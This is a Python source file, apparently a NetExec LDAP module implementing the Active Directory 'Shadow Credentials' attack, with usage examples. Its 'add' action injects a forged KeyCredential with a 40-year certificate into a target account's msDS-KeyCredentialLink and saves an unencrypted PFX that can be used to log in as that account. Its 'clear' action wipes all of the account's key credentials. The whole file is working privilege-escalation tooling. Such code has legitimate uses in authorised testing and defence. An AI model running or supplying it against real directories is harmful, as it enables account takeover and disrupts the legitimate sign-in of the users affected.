import json
from dataclasses import dataclass, field
from pathlib import Path

from cryptography.hazmat.primitives.serialization import NoEncryption
from cryptography.hazmat.primitives.serialization.pkcs12 import serialize_key_and_certificates
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.DateTime import DateTime
from dsinternals.system.Guid import Guid
from impacket.ldap.ldap import MODIFY_ADD, MODIFY_DELETE, MODIFY_REPLACE, LDAPSessionError

from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.paths import NXC_PATH
from nxc.playbooks.results import ActionResult, ResultStatus


class NXCModule:
    """
    Made by @NeffIsBack
    Heavily inspired by the pyWhisker project by Shutdown:
    https://github.com/ShutdownRepo/pywhisker
    """

    name = "shadow-creds"
    description = "List, add, inspect, remove, clear, backup, or revert Shadow Credentials on a user or computer"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    @dataclass
    class KeyCredentialInfo:
        device_id: str | None
        creation_time: str | None = None

    @dataclass
    class ResultData:
        action: str
        target: str
        target_dn: str | None = None
        is_computer: bool = False
        credentials: list = field(default_factory=list)  # list[KeyCredentialInfo] for list/info
        device_id: str | None = None  # add/remove/info
        pfx_path: str | None = None  # add (stringified Path)
        json_path: str | None = None  # backup/revert (stringified Path)
        modified: bool = False  # add/remove/clear/revert changed the directory
        count: int = 0
        error: str | None = None

    result_type = ResultData

    def options(self, context, module_options):
        """
        TARGET      sAMAccountName of the target user or computer (for example, TARGET=user or TARGET=DESKTOP-123456$)
        ACTION      Action to perform: list, add, info, remove, clear, backup, or revert (default: list); clear removes all KeyCredentials
        DEVICE_ID   KeyCredential device ID; required for info and remove
        JSONFILE    JSON backup path; required for revert and optional for backup

        Examples:
        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=list
        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=add
        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=info DEVICE_ID=<guid>
        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=remove DEVICE_ID=<guid>
        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=clear
        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=backup JSONFILE=shadow-creds.json
        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=revert JSONFILE=shadow-creds.json
        """
        self.target = module_options.get("TARGET", "").strip()
        self.action = module_options.get("ACTION", "list").lower().strip()
        self.device_id = module_options.get("DEVICE_ID")
        self.jsonfile = module_options.get("JSONFILE")

        if not self.target:
            context.log.fail("TARGET is required")
            return False
        if self.action not in {"list", "add", "info", "remove", "clear", "backup", "revert"}:
            context.log.fail("ACTION must be one of: list, add, info, remove, clear, backup, revert")
            return False
        if self.action in {"info", "remove"} and not self.device_id:
            context.log.fail(f"DEVICE_ID is required for ACTION={self.action}")
            return False
        if self.action == "revert" and not self.jsonfile:
            context.log.fail("JSONFILE is required for ACTION=revert")
            return False

    def on_login(self, context, connection):
        self.context = context
        self.connection = connection

        resp = connection.search(
            searchFilter=f"(&(objectClass=user)(sAMAccountName={self.target}))",
            attributes=["distinguishedName", "sAMAccountName", "objectClass", "msDS-KeyCredentialLink"],
        )
        resp_parsed = parse_result_attributes(resp)
        if not resp_parsed:
            context.log.fail(f"Account '{self.target}' was not found")
            data = self.ResultData(action=self.action, target=self.target, error=f"Account '{self.target}' was not found")
            return self.make_result(ResultStatus.FAILED, data)

        target_dn = resp_parsed[0]["distinguishedName"]
        self.target_dn = target_dn
        self.is_computer = "computer" in resp_parsed[0]["objectClass"]
        raw_values = resp_parsed[0].get("msDS-KeyCredentialLink", [])
        raw_values = raw_values if isinstance(raw_values, list) else [raw_values]

        if self.action == "list":
            return self.list(self.parse_credentials(raw_values))
        elif self.action == "add":
            return self.add(target_dn, self.is_computer)
        elif self.action == "info":
            return self.info(self.parse_credentials(raw_values))
        elif self.action == "remove":
            return self.remove(target_dn, self.parse_credentials(raw_values))
        elif self.action == "clear":
            return self.clear(target_dn, raw_values)
        elif self.action == "backup":
            return self.backup(raw_values)
        elif self.action == "revert":
            return self.revert(target_dn)
        return None

    def make_result(self, status, data):
        return ActionResult("ldap", self.name, self.connection.host, status, data)

    def credential_info(self, credential):
        device_id = credential.DeviceId.toFormatD().lower() if credential.DeviceId else None
        creation_time = str(credential.CreationTime) if credential.CreationTime is not None else None
        return self.KeyCredentialInfo(device_id=device_id, creation_time=creation_time)

    def parse_credentials(self, raw_values):
        credentials = []
        for raw_value in raw_values:
            try:
                # AD stores each KeyCredential as a textual DN-Binary value.
                credentials.append(
                    (
                        raw_value,
                        KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(raw_value.encode())),
                    )
                )
            except Exception as e:
                self.context.log.fail(f"Could not parse an existing KeyCredential: {e}")
        return credentials

    def get_credential(self, credentials):
        for raw_value, credential in credentials:
            if credential.DeviceId and credential.DeviceId.toFormatD().lower() == self.device_id.lower():
                return raw_value, credential
        self.context.log.fail(f"No KeyCredential with device ID {self.device_id} was found on {self.target}")
        return None

    def list(self, credentials):
        data = self.ResultData(action="list", target=self.target, target_dn=self.target_dn, is_computer=self.is_computer, credentials=[self.credential_info(credential) for _, credential in credentials], count=len(credentials))
        if not credentials:
            self.context.log.display(f"No KeyCredentials found on {self.target}")
            return self.make_result(ResultStatus.NEGATIVE, data)

        self.context.log.success(f"Found {len(credentials)} KeyCredential(s) on {self.target}")
        for _, credential in credentials:
            self.context.log.highlight(f"Device ID: {credential.DeviceId.toFormatD().lower() if credential.DeviceId else '<missing>'} | Creation time: {credential.CreationTime}")
        return self.make_result(ResultStatus.SUCCESS, data)

    def add(self, target_dn, is_computer):
        data = self.ResultData(action="add", target=self.target, target_dn=target_dn, is_computer=is_computer)
        try:
            certificate = X509Certificate2(subject=self.target, keySize=2048, notBefore=-(40 * 365), notAfter=40 * 365)
            credential = KeyCredential.fromX509Certificate2(
                certificate=certificate,
                deviceId=Guid(),
                owner=target_dn,
                currentTime=DateTime(),
                isComputerKey=is_computer,
            )
            device_id = credential.DeviceId.toFormatD().lower()
            ldap_value = credential.toDNWithBinary().toString()
            output_path = self.write_pfx(certificate, device_id)
        except Exception as e:
            self.context.log.fail(f"Failed to generate certificate and KeyCredential: {e}")
            data.error = str(e)
            return self.make_result(ResultStatus.FAILED, data)

        data.device_id = device_id
        data.pfx_path = str(output_path)
        try:
            # Add one value instead of replacing the complete multi-valued attribute.
            self.connection.ldap_connection.modify(target_dn, {"msDS-KeyCredentialLink": [(MODIFY_ADD, [ldap_value])]})
        except LDAPSessionError as e:
            self.context.log.fail(f"Failed to add the KeyCredential: {e}")
            self.context.log.display(f"Generated PFX retained at {output_path}")
            data.error = str(e)
            return self.make_result(ResultStatus.FAILED, data)

        self.context.log.success(f"Added KeyCredential with device ID {device_id} to {self.target}")
        self.context.log.highlight(f"PFX: {output_path}")
        data.modified = True
        data.count = 1
        return self.make_result(ResultStatus.SUCCESS, data)

    def write_pfx(self, certificate, device_id):
        output_dir = Path(NXC_PATH) / "modules" / "shadow-creds"
        output_dir.mkdir(parents=True, exist_ok=True)
        output_path = output_dir / f"{self.target.rstrip('$')}_{device_id}.pfx"

        output_path.write_bytes(
            serialize_key_and_certificates(
                name=self.target.encode("utf-8"),
                key=certificate.key.to_cryptography_key(),
                cert=certificate.certificate.to_cryptography(),
                cas=None,
                encryption_algorithm=NoEncryption(),
            )
        )
        return output_path

    def info(self, credentials):
        data = self.ResultData(action="info", target=self.target, target_dn=self.target_dn, is_computer=self.is_computer, device_id=self.device_id)
        result = self.get_credential(credentials)
        if result is None:
            data.error = f"No KeyCredential with device ID {self.device_id} was found on {self.target}"
            return self.make_result(ResultStatus.FAILED, data)

        _, credential = result
        self.context.log.success(f"KeyCredential {self.device_id} on {self.target}")
        for name, value in {
            "Owner": credential.Owner,
            "Device ID": credential.DeviceId.toFormatD().lower(),
            "Version": hex(credential.Version.value),
            "Key ID": credential.Identifier,
            "Key hash": credential.KeyHash.hex(),
            "Key size": getattr(credential.RawKeyMaterial, "keySize", "unknown"),
            "  Exponent (E)": credential.RawKeyMaterial.exponent,
            "  Modulus (N)": hex(credential.RawKeyMaterial.modulus),
            "  Prime 1 (P)": hex(credential.RawKeyMaterial.prime1),
            "  Prime 2 (Q)": hex(credential.RawKeyMaterial.prime2),
            "Usage": credential.Usage,
            "Legacy usage": credential.LegacyUsage,
            "Source": credential.Source,
            "Custom key info": credential.CustomKeyInfo,
            **{f"  {key}": custom_value for key, custom_value in credential.CustomKeyInfo.items()},
            "Last logon time": credential.LastLogonTime,
            "Creation time": credential.CreationTime,
        }.items():
            self.context.log.highlight(f"{name:<17} {value}")
        data.credentials = [self.credential_info(credential)]
        data.count = 1
        return self.make_result(ResultStatus.SUCCESS, data)

    def remove(self, target_dn, credentials):
        data = self.ResultData(action="remove", target=self.target, target_dn=target_dn, is_computer=self.is_computer, device_id=self.device_id)
        result = self.get_credential(credentials)
        if result is None:
            data.error = f"No KeyCredential with device ID {self.device_id} was found on {self.target}"
            return self.make_result(ResultStatus.FAILED, data)

        raw_value, _ = result
        try:
            # Delete the exact raw value so neighboring credentials remain untouched.
            self.connection.ldap_connection.modify(target_dn, {"msDS-KeyCredentialLink": [(MODIFY_DELETE, [raw_value])]})
        except LDAPSessionError as e:
            self.context.log.fail(f"Failed to remove the KeyCredential: {e}")
            data.error = str(e)
            return self.make_result(ResultStatus.FAILED, data)

        self.context.log.success(f"Removed KeyCredential {self.device_id} from {self.target}")
        data.modified = True
        data.count = 1
        return self.make_result(ResultStatus.SUCCESS, data)

    def clear(self, target_dn, raw_values):
        data = self.ResultData(action="clear", target=self.target, target_dn=target_dn, is_computer=self.is_computer, count=len(raw_values))
        if not raw_values:
            self.context.log.display(f"No KeyCredentials found on {self.target}")
            return self.make_result(ResultStatus.NEGATIVE, data)

        try:
            self.connection.ldap_connection.modify(target_dn, {"msDS-KeyCredentialLink": [(MODIFY_DELETE, [])]})
        except LDAPSessionError as e:
            self.context.log.fail(f"Failed to clear KeyCredentials: {e}")
            data.error = str(e)
            return self.make_result(ResultStatus.FAILED, data)

        self.context.log.success(f"Cleared all KeyCredentials from {self.target}")
        data.modified = True
        return self.make_result(ResultStatus.SUCCESS, data)

    def backup(self, raw_values):
        data = self.ResultData(action="backup", target=self.target, target_dn=self.target_dn, is_computer=self.is_computer, count=len(raw_values))
        output_path = Path(self.jsonfile) if self.jsonfile else Path(NXC_PATH) / "modules" / "shadow-creds" / f"{self.target.rstrip('$')}.json"
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(json.dumps({"keyCredentials": raw_values}, indent=4), encoding="utf-8")
        self.context.log.success(f"Backed up {len(raw_values)} KeyCredential(s) from {self.target} to {output_path}")
        data.json_path = str(output_path)
        return self.make_result(ResultStatus.SUCCESS, data)

    def revert(self, target_dn):
        data = self.ResultData(action="revert", target=self.target, target_dn=target_dn, is_computer=self.is_computer, json_path=str(self.jsonfile) if self.jsonfile else None)
        try:
            key_credentials = []
            for key_credential in json.loads(Path(self.jsonfile).read_text(encoding="utf-8"))["keyCredentials"]:
                if not isinstance(key_credential, (dict, str)):
                    raise ValueError("keyCredentials entries must be objects or strings")
                key_credentials.append(KeyCredential.fromDict(key_credential).toDNWithBinary().toString() if isinstance(key_credential, dict) else key_credential)
        except Exception as e:
            self.context.log.fail(f"Failed to read Shadow Credentials backup: {e}")
            data.error = str(e)
            return self.make_result(ResultStatus.FAILED, data)

        try:
            self.connection.ldap_connection.modify(target_dn, {"msDS-KeyCredentialLink": [(MODIFY_REPLACE, key_credentials)]})
        except Exception as e:
            self.context.log.fail(f"Failed to revert Shadow Credentials: {e}")
            data.error = str(e)
            return self.make_result(ResultStatus.FAILED, data)
        self.context.log.success(f"Reverted {self.target} to {len(key_credentials)} backed-up KeyCredential(s)")
        data.modified = True
        data.count = len(key_credentials)
        return self.make_result(ResultStatus.SUCCESS, data)
